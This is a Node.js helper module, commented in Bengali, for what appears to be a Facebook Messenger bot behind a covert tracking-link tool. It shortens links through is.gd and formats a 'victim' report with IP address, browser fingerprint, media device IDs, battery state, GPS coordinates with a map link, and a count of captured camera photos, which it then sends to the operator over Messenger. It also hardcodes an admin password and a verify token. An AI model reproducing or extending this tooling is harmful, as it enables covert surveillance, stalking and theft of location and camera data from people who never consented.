const axios = require('axios');
const Config = require('../models/Config');
const fs = require('fs-extra');
const path = require('path');

// ===== লোকাল কনফিগ =====
function getLocalConfig() {
    const file = path.join(__dirname, '../data/config.json');
    if (fs.existsSync(file)) {
        try {
            return fs.readJsonSync(file);
        } catch (e) {
            return { mongoUri: '', adminPassword: 'Sakib@7890' };
        }
    }
    return { mongoUri: '', adminPassword: 'Sakib@7890' };
}

// ===== MongoDB থেকে কনফিগ =====
async function getConfig() {
    try {
        let config = await Config.findOne({ key: 'bot_config' });
        if (!config) {
            config = new Config({
                key: 'bot_config',
                pageAccessToken: '',
                verifyToken: 'Sakib_Verify',
                baseUrl: ''
            });
            await config.save();
        }
        return config;
    } catch (err) {
        console.log('⚠️ MongoDB থেকে কনফিগ আনতে ব্যর্থ, লোকাল ডিফল্ট ব্যবহার:', err.message);
        return {
            pageAccessToken: '',
            verifyToken: 'Sakib_Verify',
            baseUrl: 'http://localhost:3000'
        };
    }
}

// ===== মেসেজ পাঠানো =====
async function sendMessage(recipientId, text) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token) {
            console.error('❌ পেজ অ্যাক্সেস টোকেন সেট করা নেই!');
            return;
        }
        await axios.post(`https://graph.facebook.com/v18.0/me/messages?access_token=${token}`, {
            recipient: { id: recipientId },
            message: { text: text }
        });
    } catch (err) {
        console.error('❌ মেসেজ পাঠাতে ব্যর্থ:', err.response?.data || err.message);
    }
}

// ===== ইউজার প্রোফাইল =====
async function getUserProfile(senderId) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token) return null;
        const res = await axios.get(`https://graph.facebook.com/${senderId}?access_token=${token}`);
        return res.data;
    } catch (err) {
        console.error('Profile fetch error:', err.message);
        return null;
    }
}

// ===== লিংক শর্ট করা =====
async function shortenUrl(longUrl) {
    try {
        const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
            timeout: 5000
        });
        return response.data.trim();
    } catch (err) {
        console.error('Shorten error:', err.message);
        return longUrl;
    }
}

// ===== ভিক্টিম ডেটা ফরম্যাট =====
function formatVictimData(victim) {
    let msg = '✅ **ভিক্টিমের তথ্য পাওয়া গেছে!**\n\n';
    msg += `⚓️ **আইপি:** ${victim.ip || 'N/A'} | **সময়:** ${new Date(victim.timestamp || Date.now()).toLocaleString()}\n\n`;
    msg += `⏳ **ডিভাইসের সময়:** ${new Date().toString()}\n\n`;

    const d = victim.device || {};
    msg += '📱 **ডিভাইসের তথ্য**\n';
    msg += `productSub: ${d.productSub || 'N/A'}\n`;
    msg += `vendor: ${d.vendor || 'N/A'}\n`;
    msg += `maxTouchPoints: ${d.maxTouchPoints || 'N/A'}\n`;
    msg += `doNotTrack: ${d.doNotTrack || 'N/A'}\n`;
    msg += `hardwareConcurrency: ${d.hardwareConcurrency || 'N/A'}\n`;
    msg += `cookieEnabled: ${d.cookieEnabled || 'N/A'}\n`;
    msg += `appCodeName: ${d.appCodeName || 'N/A'}\n`;
    msg += `appName: ${d.appName || 'N/A'}\n`;
    msg += `appVersion: ${d.appVersion || 'N/A'}\n`;
    msg += `platform: ${d.platform || 'N/A'}\n`;
    msg += `product: ${d.product || 'N/A'}\n`;
    msg += `userAgent: ${d.userAgent || 'N/A'}\n`;
    msg += `language: ${d.language || 'N/A'}\n`;
    msg += `languages: ${JSON.stringify(d.languages) || 'N/A'}\n`;
    msg += `webdriver: ${d.webdriver || 'N/A'}\n`;
    msg += `pdfViewerEnabled: ${d.pdfViewerEnabled || 'N/A'}\n`;
    msg += `deviceMemory: ${d.deviceMemory || 'N/A'}\n\n`;

    msg += '📷 **মিডিয়া ডিভাইস**\n';
    if (victim.media && victim.media.length > 0) {
        victim.media.forEach(m => {
            msg += `${m.kind}: ${m.label} | id=${m.deviceId}\n`;
        });
    } else {
        msg += 'কোনো ডিভাইস পাওয়া যায়নি\n';
    }
    msg += '\n';

    const n = victim.network || {};
    msg += '🕸️ **নেটওয়ার্ক**\n';
    msg += `type: ${n.type || 'N/A'}\n`;
    msg += `rtt: ${n.rtt || 'N/A'}\n`;
    msg += `saveData: ${n.saveData || 'N/A'}\n`;
    msg += `effectiveType: ${n.effectiveType || 'N/A'}\n`;
    msg += `downlink: ${n.downlink || 'N/A'}\n`;
    msg += `downlinkMax: ${n.downlinkMax || 'N/A'}\n\n`;

    const b = victim.battery || {};
    msg += '🔋 **ব্যাটারি**\n';
    msg += `লেভেল: ${b.level || 'N/A'}%\n`;
    msg += `চার্জ হচ্ছে: ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;

    if (victim.gpsLocation && victim.gpsLocation.latitude) {
        msg += `📍 **জিপিএস:** ${victim.gpsLocation.latitude}, ${victim.gpsLocation.longitude}\n`;
        msg += `🔗 গুগল ম্যাপ: ${victim.gpsLocation.googleMaps || `https://www.google.com/maps?q=${victim.gpsLocation.latitude},${victim.gpsLocation.longitude}`}\n\n`;
    } else if (victim.location && victim.location.city) {
        msg += `📍 **আনুমানিক:** ${victim.location.city}, ${victim.location.country}\n\n`;
    }

    if (victim.camera && victim.camera.length > 0) {
        msg += `📸 **ক্যামেরা ছবি:** ${victim.camera.length}টি\n`;
    }

    msg += `\n🆔 ভিক্টিম আইডি: ${victim.id}`;
    return msg;
}

module.exports = {
    getConfig,
    getLocalConfig,
    sendMessage,
    getUserProfile,
    shortenUrl,
    formatVictimData
};